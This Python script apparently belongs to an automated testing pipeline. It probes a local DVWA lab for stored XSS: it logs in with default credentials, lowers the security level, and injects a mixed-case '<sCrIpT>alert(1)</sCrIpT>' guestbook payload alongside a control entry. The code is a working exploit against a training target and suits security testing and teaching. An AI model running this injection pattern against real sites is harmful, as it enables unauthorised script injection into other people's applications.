#!/usr/bin/env python3
"""Parent-as-brain probe: DVWA Stored XSS (/vulnerabilities/xss_s/).
Usage: python3 parent_brain_sxss.py [BASE_MARKER]
Logs in as admin, sets security low, stores a guestbook entry with a
marker + script tag, then reads the page back and checks whether the
script tag is stored. Control: a plain-marker entry (no script tag).
Prints 'stored marker present' / 'stored script present' for each.

FIX (28 Oct 2026, control-contamination defect — reason recorded):
  The clean re-run (action #482) showed control script present TRUE,
  so the Stored XSS was NOT confirmed and NOTHING was filed — even
  though the first run had control script False. Likely cause: the
  guestbook keeps injected entries from earlier runs, and BOTH the
  marker (SXSS7719, reused every run) AND the script check (page-wide
  `"<sCrIpT>" in body`) saw the OLD injected entry. Two fixes:
  (1) UNIQUE MARKER PER RUN — the marker is now the base plus a
      random 8-hex suffix (e.g. SXSS7719-A1B2C3D4), so no earlier
      entry can ever carry this run's marker.
  (2) ENTRY-SCOPED SCRIPT CHECK — the script check now looks only in
      the window right after THIS run's marker (the entry carrying
      it), never page-wide, so other entries on the page cannot
      contaminate the verdict.
  The page-wide values are still printed, but only as diagnostics —
  the VERDICT line uses the entry-scoped values only. A stored XSS is
  CONFIRMED iff: stored marker present AND stored script present
  (entry-scoped) AND control script ABSENT (entry-scoped).
Pattern copied from the proven parent_brain_xss.py / parent_brain_cmdi.py.
"""
import re
import sys

import requests

BASE = "http://172.17.0.1:3100"
# Usage: python3 parent_brain_sxss.py [MARKER]
# If MARKER is given, use it VERBATIM (no random suffix) so the
# verifier's re-run with the same command reproduces the same marker
# and the same evidence. If no MARKER is given, generate a unique one
# (base + fixed default). The random-suffix design BROKE verification
# (Turn 8, 22:07 IST): the verifier re-runs the command, a new random
# marker meant the claimed marker/STORED LINE could not reproduce, and
# the claim was rejected as false_positive (exploit_confirmation FAILED).
# The brain must pass the marker it used, and the claim's command must
# include it. Default is now FIXED — pass argv[1] to override explicitly.
MARKER = sys.argv[1] if len(sys.argv) > 1 else "SXSS7719-9F3C7A1B"
SCRIPT_RE = re.compile(r"<script", re.IGNORECASE)
WINDOW = 200  # chars after the marker that belong to its entry

s = requests.Session()


def token(page_html):
    m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", page_html)
    return m.group(1) if m else ""


def script_near_entry(body, marker, window=WINDOW):
    """(2) Entry-scoped script check: is there a <script tag in the
    entry carrying THIS run's marker? Checks ONLY the LAST occurrence
    of the marker (the most recent entry carrying it — the guestbook
    lists oldest first, newest last). A script tag in an OLDER entry
    with the same marker (e.g. from a previous run re-using the
    marker, or the verifier's re-run) does not count. That was the
    contamination: checking ANY occurrence saw other entries' script
    tags. The window starts right after the marker and ends at the
    next entry ('Name: ') or after WINDOW chars, whichever comes
    first — a script tag in a LATER entry (or the page chrome) does
    not count."""
    idxs = [m.start() for m in re.finditer(re.escape(marker), body)]
    if not idxs:
        return False, False
    m_end = idxs[-1] + len(marker)
    span = body[m_end:m_end + window]
    nxt = span.find("Name: ")
    if nxt != -1:
        span = span[:nxt]
    return bool(SCRIPT_RE.search(span)), True


def entry_line(body, marker):
    """The entry carrying the LAST occurrence of this run's marker —
    from its 'Name: ' start through the message — as the evidence."""
    idxs = [m.start() for m in re.finditer(re.escape(marker), body)]
    if not idxs:
        return ""
    start = body.rfind("Name: ", 0, idxs[-1])
    if start == -1:
        start = max(0, idxs[-1] - 60)
    return body[start:idxs[-1] + len(marker) + 120].replace("\n", " ")[:220]


# Login
r = s.get(BASE + "/login.php", timeout=15)
r = s.post(BASE + "/login.php",
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": token(r.text)},
           timeout=15)
print("login", r.status_code)
print("marker", MARKER)

# Security low
r = s.get(BASE + "/security.php", timeout=15)
r = s.post(BASE + "/security.php",
           data={"security": "low", "seclev_submit": "Submit",
                 "user_token": token(r.text)},
           timeout=15)
print("security", r.status_code)


def post_entry(name, message):
    r = s.get(BASE + "/vulnerabilities/xss_s/", timeout=15)
    r = s.post(BASE + "/vulnerabilities/xss_s/",
               data={"txtName": name, "mtxMessage": message,
                     "btnSign": "Sign Guestbook",
                     "user_token": token(r.text)},
               timeout=15)
    return r.status_code


def read_back():
    r = s.get(BASE + "/vulnerabilities/xss_s/", timeout=15)
    return r.status_code, r.text


# Control: plain marker, no script tag
post_entry("ctrl-" + MARKER, MARKER)
code, body = read_back()
print("control", code, "len", len(body))
print("control marker present:", MARKER in body)
ctrl_script, _ = script_near_entry(body, MARKER)
print("control script present (entry-scoped):", ctrl_script)
print("control script present (page-wide, diagnostic only):", bool(SCRIPT_RE.search(body)))

# Injected: marker + script tag
post_entry("inj-" + MARKER, MARKER + "<sCrIpT>alert(1)</sCrIpT>")
code, body = read_back()
print("stored", code, "len", len(body))
print("stored marker present:", MARKER in body)
stored_script, _ = script_near_entry(body, MARKER)
print("stored script present (entry-scoped):", stored_script)
print("stored script present (page-wide, diagnostic only):", bool(SCRIPT_RE.search(body)))
print("STORED LINE:", entry_line(body, MARKER))

# Verdict — entry-scoped values only. A contaminated control (an old
# injected entry elsewhere on the page) can no longer flip this: the
# old entries carry a different marker, and the check never looks
# outside this run's entry.
# Playbook rule #3 (FIX 29 Oct 18:55 IST — reason recorded): the LAST
# line must be EXACTLY `VERDICT: CONFIRMED` or `VERDICT: FAILED`.
# The engine's parser (brain-engine-v2.py VERDICT_RE) rejects any
# trailing text, and `VERDICT: NOT confirmed` never parses — so the
# diagnostic `VERDICT reason:` line must come BEFORE the final verdict.
confirmed = (MARKER in body) and stored_script and not ctrl_script
if not confirmed:
    print("VERDICT reason: need stored marker present + stored script present (entry-scoped) + control script absent (entry-scoped)")
print("VERDICT: CONFIRMED" if confirmed else "VERDICT: FAILED")
